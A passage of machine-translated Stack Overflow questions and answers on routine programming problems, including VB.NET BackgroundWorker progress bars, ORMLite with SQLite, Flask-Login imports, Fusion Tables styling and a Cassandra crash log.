    Dim x as integer    
    For x = 0 to 100
     'Do your calculations as you loop
      'This is where you report back to the worker to change progress bar   
        Me.BackgroundWorker1.ReportProgress(x)
    Next x

End function

Private Sub BackgroundWorker1_ProgressChanged(ByVal sender As Object, ByVal e As System.ComponentModel.ProgressChangedEventArgs) Handles BackgroundWorker2.ProgressChanged

    Me.pbConvertion.Value = e.ProgressPercentage
    Me.g_intProgress = e.ProgressPercentage
    Me.pbConvertion.Maximum = "100"
    Me.pbConvertion.Update()
    Me.lblProgbar.Text = "Percentage - " & Me.pbConvertion.Value & "% Completed"
End Sub

Private Sub BackgroundWorker1_RunWorkerCompleted(ByVal sender As Object, ByVal e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles BackgroundWorker1.RunWorkerCompleted
    Me.lblProgbar.Text = "Step One Completed"
End Sub 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-16T11:33:32.627

你需要设置：

Backgroundworker 可以使用进度条

后台工作者可以报告进度

```
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
     BW1.RunAsync()
End Sub 
```

然后：

```
Private Sub BW1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BW1.DoWork

    Dim i as integer = 1
    Do Until integer = 0

        IF BW1.CancellationPending = True then
             MsgBox("Cancelled by user")
             Exit Sub
        End If

         ....

        BW1.ReportProgress(i)

    Loop

End Sub 
```

显示进度：

```
Private Sub BW1_ProgressChanged(ByVal sender As Object, ByVal e As System.ComponentModel.ProgressChangedEventArgs) Handles BW1.ProgressChanged
     Progressbar1.Value = e.ProgressPercentage  
End Sub 
```

编辑：

您不能直接在 DoWork 方法上使用 UI 控件。您需要首先委派它们，但为了显示进度（进度条、标签等）Backgroundworker 拥有它自己的方法（ProgressChanged()），可以让您在安全模式下使用 UI。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-22T09:56:02.727

已经为您提供了更好的解决方案，但这里是我用来让您的想法发挥作用的更改：

1.  正如您在评论中所问的那样，`BackgroundWorker`仅执行`DoWork`一次事件。所以在事件中`RunWorkerAsync`再次调用。`RunWorkerCompleted`
2.  VB.NET 通常在你使用的时候提供委托`AddressOf`，但是`Control.Invoke`太笼统了，所以你必须指定一个。但是，该框架提供`MethodInvoker`. 因此，更改`SystemLoads`为`Sub`.
3.  一些“百分比”`PerfomaceCounters`似乎不遵守`0<=%<=100`.

因此，让您克服当前障碍的简单更改为您提供：

```
Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    BackgroundWorker1.RunWorkerAsync()
End Sub

Sub SystemLoads()
    Dim PCV As Integer = Convert.ToInt32(PerformanceCounter1.NextValue())
    Me.Label5.Text = PCV & " %"
    Me.ProgressBar1.Minimum = 0
    Me.ProgressBar1.Maximum = 100
    Me.ProgressBar1.Step = 1
    Me.ProgressBar1.Value = Math.Min(Math.Max(0, PCV), 100)
    Me.Label6.Text = Now.ToLongTimeString
End Sub

Private Sub BackgroundWorker1_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker1.DoWork
    Me.Invoke(New Methodinvoker(AddressOf SystemLoads))
End Sub

Private Sub BackgroundWorker1_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles BackgroundWorker1.RunWorkerCompleted
    BackgroundWorker1.RunWorkerAsync()
End Sub 
```

这导致了我在此[LinqPad 查询](http://share.linqpad.net/khag9n.linq)中解决的其他一些问题，特别是：

1.  总是`ObjectDisposedException`在关闭窗口。我尝试减轻它，但最后，我只是在`Form`处理它时忽略了它。
2.  否则照顾例外情况。
3.  `Sleep`稍微减少更新，以减少调整表单大小时的迟缓。这是它表明a`Timer`会更好的地方。
4.  `If InvokeRequired`即使这里不需要，也要使用正确的模式。

注意，我必须自己制作控制位置，而且它们几乎不能正常工作。此外，您必须将`PerformanceCounter`至少更改为`InstanceName`系统上存在的一个。

# android - 如何单独构建 SQLite 数据库并在 maven build 中捆绑到 android 应用程序

> ID：11751945
> 
> 赞同：3
> 
> 时间：2012-08-01T02:55:07.193
> 
> 标签：android, maven, ormlite

我有一个单独的 Web 服务来获取应用程序所需的数据（txt 数据 + 图像 URL 以下载图像），这是我的应用程序中唯一的服务，我在应用程序启动时调用此服务并设置 SQLite 数据库（使用 ORMLite），一旦一切完成，用户就可以进入主屏幕，因此在下次启动时，如果数据在数据库中，则此服务不会调用。到目前为止一切正常。

我的问题是如何在 android 应用程序之外构建这个 SQLite DB 并将 SQLite 数据库文件捆绑到应用程序；我正在使用 maven 构建 android 应用程序。

1.  我是否需要一个单独的 android 项目来调用 Web 服务并构建 SQLite DB，或者我可以使用 java 项目来构建 SQLite Db，

2.  如果我使用 android 项目如何获取数据库文件？

3.  如何指示 maven 运行上述项目并将 db 文件复制到 android 应用程序。

我从一个 maven 项目开始，以下是我的 pom xml 文件的快照

```
 <dependencies>
  <dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-io</artifactId>
    <version>1.3.2</version>
</dependency>

<dependency>
    <groupId>log4j</groupId>
    <artifactId>log4j</artifactId>
    <version>1.2.16</version>
</dependency>

<dependency>
    <groupId>com.google.code.gson</groupId>
    <artifactId>gson</artifactId>
    <version>2.2.2</version>
</dependency>

<dependency>
    <groupId>com.j256.ormlite</groupId>
    <artifactId>ormlite-core</artifactId>
    <version>4.41</version>
</dependency>

<dependency>
    <groupId>com.j256.ormlite</groupId>
    <artifactId>ormlite-jdbc</artifactId>
    <version>4.41</version>
</dependency>

<dependency>
      <groupId>org.xerial</groupId>
      <artifactId>sqlite-jdbc</artifactId>
      <version>3.6.16</version>
    </dependency>

  </dependencies> 
```

当我尝试将数据插入数据库时​​出现以下异常。

```
at com.j256.ormlite.misc.SqlExceptionUtil.create(SqlExceptionUtil.java:22)
    at com.j256.ormlite.stmt.mapped.MappedCreate.insert(MappedCreate.java:124)
    at com.j256.ormlite.stmt.StatementExecutor.create(StatementExecutor.java:363)
    at com.j256.ormlite.dao.BaseDaoImpl.create(BaseDaoImpl.java:306)

Caused by: java.sql.SQLException: NYI
    at org.sqlite.Conn.prepareStatement(Conn.java:443)
    at com.j256.ormlite.jdbc.JdbcDatabaseConnection.insert(JdbcDatabaseConnection.java:147)
    at com.j256.ormlite.stmt.mapped.MappedCreate.insert(MappedCreate.java:89)
    ... 4 more 
```

我的域对象

```
@DatabaseTable
public class Widget implements Comparable<Widget>{

    @DatabaseField(id = true)
    private String id = null;

    @DatabaseField
    private String title = null;
....More fileds.

    @ForeignCollectionField
    private ForeignCollection<WidgetAttribute> db_widget_attribute;

    @DatabaseField(canBeNull = true, foreign = true)
    private AdvancedSettings advanced_settings = null;
... Getters /setters....
}

@DatabaseTable
public class WidgetAttribute {

    @DatabaseField(id = true)
    private String id = null;

    @DatabaseField
    private String value = null;
    ....More fileds.

    @DatabaseField(foreign=true,foreignAutoRefresh=true)
    private Widget widget;
    ... Getters /setters....
 }

@DatabaseTable
public class AdvancedSettings {
    @DatabaseField(id = true)
    private String id = null;

    public static final String  DB_COLUMN_SHOW_AS_TAB_BAR = "show_as_tab_bar"; 

    @DatabaseField
    private String show_as_tab_bar = null;
    ....More fileds

    @DatabaseField(canBeNull = true, foreign = true)
    private AdvancedSettingsImages advanced_settings_images = null;

   @DatabaseField(foreign=true,foreignAutoRefresh=true)
    private Widget widget;

    public String getId() {
        return id;
    }
        ... Getters /setters....
}   

@DatabaseTable
public class AdvancedSettingsImages {
    @DatabaseField(generatedId=true)
    private int id;

     ....More fileds

    @DatabaseField(canBeNull = true, foreign = true)
    private AdvancedSettings advancedSettings = null;

    ... Getters /setters....

 } 
```

当我运行应用程序时，我在控制台中看到以下日志消息

```
DEBUG [com.j256.ormlite.dao.DaoManager] created dao for class class com.xxx.domain.Widget with reflection 
DEBUG [com.j256.ormlite.dao.DaoManager] created dao for class class com.xxx.domain.WidgetAttribute with reflection 
DEBUG [com.j256.ormlite.dao.DaoManager] created dao for class class com.xxx.domain.AdvancedSettings with reflection 
DEBUG [com.j256.ormlite.dao.DaoManager] created dao for class class com.xxx.domain.AdvancedSettingsImages with reflection 

INFO  [com.j256.ormlite.table.TableUtils] creating table 'widget' 
INFO  [com.j256.ormlite.table.TableUtils] executed create table statement changed 0 rows: CREATE TABLE IF NOT EXISTS `widget` (`id` VARCHAR , `title` VARCHAR , `widget_type_id` VARCHAR , `app_xxx_id` VARCHAR , `created_at` VARCHAR , `updated_at` VARCHAR , `position` VARCHAR , `group_widget` VARCHAR , `parent_id` VARCHAR , `image_link` VARCHAR , `advanced_settings_id` VARCHAR , `widgets_id` INTEGER NOT NULL , PRIMARY KEY (`id`) )  
INFO  [com.j256.ormlite.table.TableUtils] creating table 'widgetattribute' 
INFO  [com.j256.ormlite.table.TableUtils] executed create table statement changed 0 rows: CREATE TABLE IF NOT EXISTS `widgetattribute` (`id` VARCHAR , `value` VARCHAR , `attribute_type` VARCHAR , `name` VARCHAR , `created_at` VARCHAR , `updated_at` VARCHAR , `image_link` VARCHAR , `widget_id` VARCHAR , PRIMARY KEY (`id`) )  
INFO  [com.j256.ormlite.table.TableUtils] creating table 'advancedsettings' 
INFO  [com.j256.ormlite.table.TableUtils] executed create table statement changed 0 rows: CREATE TABLE IF NOT EXISTS `advancedsettings` (`id` VARCHAR , `show_widget_on_home_screen` VARCHAR , `highlight_cell` VARCHAR , `hide_menu` VARCHAR , `show_as_tab_bar` VARCHAR , `icon_color` VARCHAR , `live_tile` VARCHAR , `text_color` VARCHAR , `vertical_alignment` VARCHAR , `horizontal_alignment` VARCHAR , `created_at` VARCHAR , `updated_at` VARCHAR , `advanced_settings_images_id` INTEGER , `widget_id` VARCHAR , PRIMARY KEY (`id`) )  
INFO  [com.j256.ormlite.table.TableUtils] creating table 'advancedsettingsimages'
INFO  [com.j256.ormlite.table.TableUtils] executed create table statement changed 0 rows: CREATE TABLE IF NOT EXISTS `advancedsettingsimages` (`id` INTEGER PRIMARY KEY AUTOINCREMENT , `tab_bar_icon` VARCHAR , `tab_bar_icon_on_press` VARCHAR , `widget_icon` VARCHAR , `widget_icon_on_press` VARCHAR , `advancedSettings_id` VARCHAR )  

java.sql.SQLException: Unable to run insert stmt on object 

    at com.j256.ormlite.misc.SqlExceptionUtil.create(SqlExceptionUtil.java:22)
    at com.j256.ormlite.stmt.mapped.MappedCreate.insert(MappedCreate.java:124)
    at com.j256.ormlite.stmt.StatementExecutor.create(StatementExecutor.java:352)
    at com.j256.ormlite.dao.BaseDaoImpl.create(BaseDaoImpl.java:306)

Caused by: java.sql.SQLException: [SQLITE_ERROR] SQL error or missing database (near ")": syntax error)
    at org.sqlite.DB.newSQLException(DB.java:374)
    at org.sqlite.DB.newSQLException(DB.java:378)
    at org.sqlite.DB.throwex(DB.java:365)
    at org.sqlite.NativeDB.prepare(Native Method)
    at org.sqlite.DB.prepare(DB.java:123)
    at org.sqlite.PrepStmt.<init>(PrepStmt.java:44)
    at org.sqlite.Conn.prepareStatement(Conn.java:403)
    at org.sqlite.Conn.prepareStatement(Conn.java:398)
    at org.sqlite.Conn.prepareStatement(Conn.java:382)
    at org.sqlite.Conn.prepareStatement(Conn.java:386)
    at com.j256.ormlite.jdbc.JdbcDatabaseConnection.insert(JdbcDatabaseConnection.java:147)
    at com.j256.ormlite.stmt.mapped.MappedCreate.insert(MappedCreate.java:89)
    ... 4 more 
```

有人可以帮我解决上述问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T17:13:41.450

根据这个问题（[SQLiteJDBC 和 PreparedStatement to use pragma table_info](https://stackoverflow.com/questions/1344599/sqlitejdbc-and-preparedstatement-to-use-pragma-table-info)），`NYI`表示尚未实现，并且在尝试准备创建 SQL 语句时被 Sqlite 抛出。如果有任何问题，这与maven无关。

我很想看看你的架构。也许您正在尝试将某种自定义语句与 Sqlite 一起使用？

# c++ - int 的默认值是 1 吗？

> ID：11751953
> 
> 赞同：3
> 
> 时间：2012-08-01T02:55:48.457
> 
> 标签：c++

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-01T03:00:14.053

`a`is not an `int`：它是一个没有参数并返回一个`int`. 因为它是一个函数声明，`a`也不是一个局部变量，它没有“默认值”。

该程序格式错误，因为您从未定义函数`a`但您尝试*使用*它（通过在插入表达式中获取其地址）。因此，它违反了单一定义规则。

如果你`a`在程序中定义，`1`会被打印出来，因为函数的地址`a`会被转换为`bool`：`operator<<`有`bool`参数的重载是函数指针参数类型的最佳匹配。

[注意：如果你`a`用 Visual C++ 定义和编译，它会打印函数的地址，而不是`1`. 这是（我认为）因为 Visual C++ 允许将函数指针隐式转换为`void*`，然后`operator<<`具有`void const*`参数的重载是函数指针参数类型的最佳匹配。如果您在禁用语言扩展 ( ) 的情况下进行编译，则将按预期选择`/Za`带有参数的重载。]`bool`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T04:22:00.420

正如 James McNellis 所说，您不是在声明一个 int，而是在声明一个函数。

但是，您可以使用默认值初始化 int，如下所示：

```
int i = int(); 
```

而且默认值不是1，是0。

```
std::cout << "this prints '0': " << int() << '\n'; 
```

* * *

在 C++11 中，您可以使用统一初始化：

```
int i {}; 
```

花括号不会像圆括号那样混淆函数声明的一部分。

# google-maps - 谷歌融合表 - 无法在 5 种颜色后为地图中的图层着色

> ID：11751960
> 
> 赞同：1
> 
> 时间：2012-08-01T02:56:47.720
> 
> 标签：google-maps, google-maps-api-3, google-fusion-tables

我根据不同的条件在图层中用不同颜色为国家多边形着色。但是在五个“where”条件之后，它没有检测到相关的颜色。但使用默认颜色。为什么会这样？下面是我的代码：

```
 layer.setOptions({
        query: {
          select: 'masterNarrative, countryName',
          from: tableId,
          where: where
        },
        styles: [{
            where: "masterNarrative= '72 virgins (houris)' ",
            polygonOptions: {
              fillColor: '#2daebf',
              fillOpacity: 0.5
            }
          },
          {
              where: "masterNarrative= 'Badr' ",
              polygonOptions: {
                fillColor: '#e33100',
                fillOpacity: 0.5
              }
            },
            {
                where: "masterNarrative= 'Crusaders/Colonization' ",
                polygonOptions: {
                  fillColor: '#a9014b',
                  fillOpacity: 0.5
                }
              },
              {
                  where: "masterNarrative= 'Nakba (Palestine)' ",
                  polygonOptions: {
                    fillColor: '#871F78',
                    fillOpacity: 0.5
                  }
                },
                {
                    where: "masterNarrative= 'Hypocrites (Munafiqun)' ",
                    polygonOptions: {
                      fillColor: '#ff5c00',
                      fillOpacity: 0.5
                    }
                  },
                  {
                      where: "masterNarrative= 'Mahdi' ",
                      polygonOptions: {
                        fillColor: '#ffb515',
                        fillOpacity: 0.5
                      }
                    },
                    {
                        where: "masterNarrative= 'Musaylimah' ",
                        polygonOptions: {
                          fillColor: '#34925E',
                          fillOpacity: 0.5
                        }
                      },
                        {
                            where: "masterNarrative= 'Pharaoh' ",
                            polygonOptions: {
                              fillColor: '#E066FF',
                              fillOpacity: 0.5
                            }
                          },
                          {
                              where: "masterNarrative= 'Puppet Master' ",
                              polygonOptions: {
                                fillColor: '#00FF00',
                                fillOpacity: 0.5
                              }
                            }]
      }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T04:14:10.090

正如 FusionTablesLayer 的限制中所述：您可以使用 Maps API 将最多五个 Fusion Tables 图层添加到地图中，其中一个可以使用最多五个样式规则设置样式。

避免使用五个样式规则来设置每个“masterNarrative”列的颜色的一种方法是使用 Fusion Tables UI 来设置颜色，而不是通过 FusionTablesLayer 在 javascript 中进行设置。为此，您可以在表中创建另一个名为“fillColor”的列，并将该列的值设置为您想要的行颜色。然后你可以去 Visualize -> Map，然后 Configure Styles，然后 Fill Color -> Column 来选择应该为地图着色的列。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-25T16:42:20.283

我发现调用 FusionTablesLayer 时这些填充颜色没有通过。我在 Fusion 中使用存储桶技术，但是当我调用地图时，我只是得到了默认标记。我希望能够在 Fusion 中使用该功能，因为在 javascript 中执行该功能似乎是多余的。

[使用 FusionTablesLayer 调用地图](http://wrestore.iupui.edu/fusion/form_example.php)[融合地图](https://www.google.com/fusiontables/DataSource?docid=1womq9tHftrv-myf-HyjiXnwLhvVvCkNzL0L_g7g)

# php - PHP 单元测试：测试应该与类在同一个命名空间下吗？

> ID：11751963
> 
> 赞同：13
> 
> 时间：2012-08-01T02:57:15.893
> 
> 标签：php, namespaces, phpunit

Symfony 2.0 包目录结构，通常，有一个`Tests`应该放置测试的目录。

```
Acme
    -> SomeBundle
        -> Controller
        -> Entity
        -> Service
        -> ...
        -> Tests
            -> Controller
            -> Entity
            -> Service
            -> ...
    -> OtherBundle
    -> ... 
```

我知道即使它们与测试的类不在同一个命名空间下，测试也能正常工作。

```
namespace Acme\SomeBundle\Service;

/**
 * Some service.
 *
 * @author varchar
 * @since  August 1, 2012
 */
class SomeService
{
} 
```

对于上面的类，我（对于一个）通常会在以下名称空间下进行测试（受目录结构的影响）：

```
namespace Acme\SomeBundle\Tests\Service; 
```

现在，这工作正常。

然而，顺便说一句，我使用的 Netbeans IDE 无法找到测试类，除非它位于相同的命名空间下（这在您只想测试单个文件时很明显）。好吧，这可能只是一个 Netbeans 标准（或其他东西）。

然而无论如何，将测试放在与被测试类相同的命名空间下是否合适？这样做有什么好处吗？

## 问题

**1）**将测试放在与被测试类相同的命名空间下是否合适？

**2）**这样做有什么好处吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-03T13:30:23.743

**将测试放在与被测试类相同的命名空间下是否合适？**

到目前为止，还没有这方面的问题。因此，目前这可能只是个人喜好问题。

**这样做有什么好处吗？**

好像有。

**1）**由于测试和类将共享相同的命名空间，不需要

```
use Acme\SomeBundle\Tests\Service 
```

在测试课上。换句话说，创建一个与类共享相同命名空间的测试会稍微方便一些。

**2)**如果您使用的是 NetBeans，那么您将能够使用 IDE 在单个类上运行测试。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T08:23:41.563

在 Bundles 中，这是为了让您获得的包也将包含所有测试，以便您可以运行它们。Symfony 组件也是如此，因为它们也是自包含的包。主要取决于你的风格。另一个常见的模式是 github.com/vandpibe/security

# python - Flask 和 Flask-Login 的新手 - ImportError: No module named login

> ID：11751972
> 
> 赞同：17
> 
> 时间：2012-08-01T02:58:06.143
> 
> 标签：python, flask

安装烧瓶登录似乎有问题。尽管使用以下成功安装

```
 pip install flask-login 
```

我的 app.py 文件：

```
 from flaskext.login import LoginManager
 lm = LoginManager() 
```

我收到此错误：

```
ImportError: No module named login 
```

那我该如何解决

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-01T05:34:58.800

烧瓶扩展导入方式有一个过渡：

> 相反，我们现在建议命名包`flask_foo`而不是现在已弃用的`flaskext.foo`. Flask 0.8 引入了一个重定向导入系统，允许使用 import from`flask.ext.foo`并且它会`flask_foo`先尝试，如果失败`flaskext.foo`。
> 
> Flask 扩展应该敦促用户从而不是 flask_foo 或 flaskext_foo**导入**，**`flask.ext.foo`**以便扩展可以转换到新的包名称而不影响用户。（[来源](http://flask.pocoo.org/docs/extensiondev/#extension-import-transition)）

将此导入方式与 Flask 0.8 或更高版本一起使用：

```
from flask.ext.login import LoginManager 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-06-19T11:57:58.607

对于 flask-login 0.3.2 及更高版本，方法如下：

```
from flask_login import LoginManager 
```

要查找烧瓶登录版本，您可以在终端中运行以下命令。只需更改名称即可知道其他软件包的版本。

```
pip show flask-login 
```

注意：-不确定从哪个版本的烧瓶登录遵循此约定

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-11-04T01:41:22.880

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-02-22T18:27:10.100

Use this for importing LoginManager

from flask_login import LoginManager

Login = LoginManager()

Flask login tutorial [https://learnpyjs.blogspot.com/2021/02/how-to-setup-user-login-in-flask.html?m=1](https://learnpyjs.blogspot.com/2021/02/how-to-setup-user-login-in-flask.html?m=1)

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2013-12-09T08:52:36.470

```
sudo pip install Flask-Security 
```

# scheduled-tasks - 在默认用户帐户中创建计划任务

> ID：11751978
> 
> 赞同：3
> 
> 时间：2012-08-01T02:59:03.270
> 
> 标签：scheduled-tasks

我有一个应用程序，它将在 win7 中为当前用户创建计划任务。

有一个特殊要求是说这个计划任务应该为每个新创建的用户自动创建。有什么办法可以做到这一点？

我正在考虑使用窗口默认用户配置文件来实现这一点，但我不知道该怎么做。

# c# - System.Management - 对象引用未设置为对象的实例

> ID：11751980
> 
> 赞同：0
> 
> 时间：2012-08-01T02:59:27.987
> 
> 标签：c#, system

```
private string Find(string key)
    {
        string result = null;
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity");
            foreach (ManagementObject queryObj in searcher.Get())
                if (queryObj["Caption"].ToString().Contains(key))
                {
                    result = queryObj["Caption"].ToString();
                    break;
                }
        }
        catch (Exception ex)
        {                                                                
              MessageBox.Show(ex.Message);                
        }
        return result;
    } 
```

我添加参考：System.Management 以使用此功能查找设备。它可以在**Window 7**上运行，但在**Window XP**上出现错误：**对象引用未设置为对象的实例**

如何解决这个错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-05T10:03:27.377

在我早期的开发中，我遇到了这个问题。手头的问题很简单：ManagementObject 正在抛出一个`NullReferenceException`. 简单的答案是添加一个简单的属性检查：

```
ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity");
            foreach (ManagementObject queryObj in searcher.Get())
                if (queryObj["Caption"] != null)
                {
                    result = queryObj["Caption"].ToString();
                    break;
                } 
```

# bash - Bash 脚本以使用绝对路径查找特定类型的文件并按大小对其进行排序

> ID：11751987
> 
> 赞同：1
> 
> 时间：2012-08-01T03:00:18.727
> 
> 标签：bash, find, ls

在 bash 中，如何在目录及其子目录中搜索特定类型的文件（比如“*.txt”）。然后按大小降序显示文件及其大小和完整路径。

我尝试了以下但它不起作用。

```
find . -type f -name "*.txt" -print0 | ls -sS 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T03:19:22.557

您可以使用 GNU find 的 printf 选项来完成此操作：

```
find "$PWD" -type f -name '*.txt' -printf "%s %h/%f\n" | sort -rg 
```

要以 KB 而非字节为单位显示大小：

```
find "$PWD" -type f -name '*.txt' -printf "%k %h/%f\n" | sort -rg 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T03:06:43.313

```
find . -type f -name "*.txt" -print0 | xargs -0 ls -sS 
```

除非有大量匹配文件，否则应该可以工作（man xargs(1) 查看默认值是什么）

如果 100% 正确，Swiss 在下面的评论`xargs -0`是您使用的方法`find -print0`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T03:08:53.027

```
find . -type f -name "*.txt" | xargs -i{} stat {} --format "%012s %n" | sort -r 
```

以字节为单位给出大小。

# c++ - 如何让 STL std::rel_ops 与带有 STLPort 的 Digital Mars C++ 编译器一起工作？

> ID：11751990
> 
> 赞同：1
> 
> 时间：2012-08-01T03:00:24.657
> 
> 标签：c++, stl, stlport

我在 Windows 上安装了 Digital Mars C/C++ 编译器。这是包含预建 STLPort 的完整付费版本）它是 dm852.zip，但 dmc 报告 8.42n。STLPort 在自述文件中说版本 4.5.3。

根据使用 STLPort 的要求，我将 sc.ini 更新为：

INCLUDE="%@P%..\stlport\stlport";"%@P%..\include";%INCLUDE%

以下测试程序使用 MinGW g++ 编译良好，但使用 dmc 会给出注释中显示的错误。

```
#include <assert.h>
#include <utility>
using namespace std;
using namespace std::rel_ops;

class C {
    int x;
public:
    C(int x_) : x(x_)
        { }
    bool operator<(const C& other) const
        { return x < other.x; }
    bool operator==(const C& other) const
        { return x == other.x; }
};

int main() {
    C a(1);
    C b(1);
    C c(2);

    assert(a == b);
    assert(b != c); // Error: illegal operand types Had: C and C
    assert(a < c);
    assert(c > a); // Error: illegal operand types Had: C and C
    return 0;
} 
```

我可以在 dm/stl/stl_relops.h 中找到实际的 relops 代码

但我不确定 dm/stlport/stlport/utility 应该如何包含此代码

STLPort 的 Digital Mars 版本似乎配置为不使用 rel_ops 命名空间（dm/stlport/stlport/config/stl_dm.h 中的#define _STLP_NO_RELOPS_NAMESPACE），但省略“使用命名空间 std::rel_ops”没有帮助。

看来这一定是某种配置问题，但我无法弄清楚。

# python - Cassandra 崩溃，不知道出了什么问题

> ID：11751993
> 
> 赞同：2
> 
> 时间：2012-08-01T03:01:09.883
> 
> 标签：python, cassandra, pycassa

系统在一段时间后崩溃，但有以下异常：

**Python Pycassa 异常读取：**

> 错误：尝试连接到每台服务器两次，但均未成功。最后一次失败是 TTransportException: Could not connect to 10.242.253.141:9160

**Cassandra 系统日志**

```
 WARN [MemoryMeter:1] 2012-07-31 12:44:17,555 Memtable.java (line 197) setting live ratio to minimum of 1.0 instead of 0.16881217597040166
 INFO [MemoryMeter:1] 2012-07-31 12:44:17,555 Memtable.java (line 213) CFS(Keyspace='system', ColumnFamily='HintsColumnFamily') liveRatio is 1.0 (just-counted was 1.0).  calculation took 28ms for 122 columns
 WARN [MemoryMeter:1] 2012-07-31 12:44:22,583 Memtable.java (line 197) setting live ratio to minimum of 1.0 instead of 0.11368422493368459
 INFO [MemoryMeter:1] 2012-07-31 12:44:22,586 Memtable.java (line 213) CFS(Keyspace='system', ColumnFamily='HintsColumnFamily') liveRatio is 1.0 (just-counted was 1.0).  calculation took 39ms for 358 columns
 INFO [GossipTasks:1] 2012-07-31 12:44:22,609 Gossiper.java (line 811) InetAddress /10.204.81.77 is now dead.
 WARN [MemoryMeter:1] 2012-07-31 12:44:25,244 Memtable.java (line 197) setting live ratio to minimum of 1.0 instead of 0.13325571841646536
 INFO [MemoryMeter:1] 2012-07-31 12:44:25,244 Memtable.java (line 213) CFS(Keyspace='system', ColumnFamily='HintsColumnFamily') liveRatio is 1.0 (just-counted was 1.0).  calculation took 46ms for 484 columns
 INFO [StorageServiceShutdownHook] 2012-07-31 12:44:26,679 CassandraDaemon.java (line 218) Stop listening to thrift clients
 INFO [StorageServiceShutdownHook] 2012-07-31 12:44:26,762 MessagingService.java (line 539) Waiting for messaging service to quiesce
 INFO [ACCEPT-/10.242.253.141] 2012-07-31 12:44:26,780 MessagingService.java (line 695) MessagingService shutting down server thread.
ERROR [Thrift:40765] 2012-07-31 12:44:26,858 CustomTThreadPoolServer.java (line 204) Error occurred during processing of message.
java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down
    at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:60)
    at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:816)
    at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1337)
    at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:110)
    at org.apache.cassandra.service.StorageProxy.scheduleLocalHint(StorageProxy.java:386)
    at org.apache.cassandra.service.StorageProxy.sendToHintedEndpoints(StorageProxy.java:339)
    at org.apache.cassandra.service.StorageProxy$2.apply(StorageProxy.java:119)
    at org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:260)
    at org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:193)
    at org.apache.cassandra.thrift.CassandraServer.doInsert(CassandraServer.java:637)
    at org.apache.cassandra.thrift.CassandraServer.internal_insert(CassandraServer.java:511)
    at org.apache.cassandra.thrift.CassandraServer.insert(CassandraServer.java:519)
    at org.apache.cassandra.thrift.Cassandra$Processor$insert.getResult(Cassandra.java:3016)
    at org.apache.cassandra.thrift.Cassandra$Processor$insert.getResult(Cassandra.java:3004)
    at org.apache.thrift.ProcessFunction.process(ProcessFunction.java:32)
    at org.apache.thrift.TBaseProcessor.process(TBaseProcessor.java:34)
    at org.apache.cassandra.thrift.CustomTThreadPoolServer$WorkerProcess.run(CustomTThreadPoolServer.java:186)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)
ERROR [Thrift:42739] 2012-07-31 12:44:26,935 CustomTThreadPoolServer.java (line 204) Error occurred during processing of message.
java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down
    at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:60)
    at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:816)
    at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1337)
    at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:110)
    at org.apache.cassandra.service.StorageProxy.scheduleLocalHint(StorageProxy.java:386)
    at org.apache.cassandra.service.StorageProxy.sendToHintedEndpoints(StorageProxy.java:339)
    at org.apache.cassandra.service.StorageProxy$2.apply(StorageProxy.java:119)
    at org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:260)
    at org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:193)
    at org.apache.cassandra.thrift.CassandraServer.doInsert(CassandraServer.java:637)
    at org.apache.cassandra.thrift.CassandraServer.internal_batch_mutate(CassandraServer.java:587)
    at org.apache.cassandra.thrift.CassandraServer.batch_mutate(CassandraServer.java:595)
    at org.apache.cassandra.thrift.Cassandra$Processor$batch_mutate.getResult(Cassandra.java:3112)
    at org.apache.cassandra.thrift.Cassandra$Processor$batch_mutate.getResult(Cassandra.java:3100)
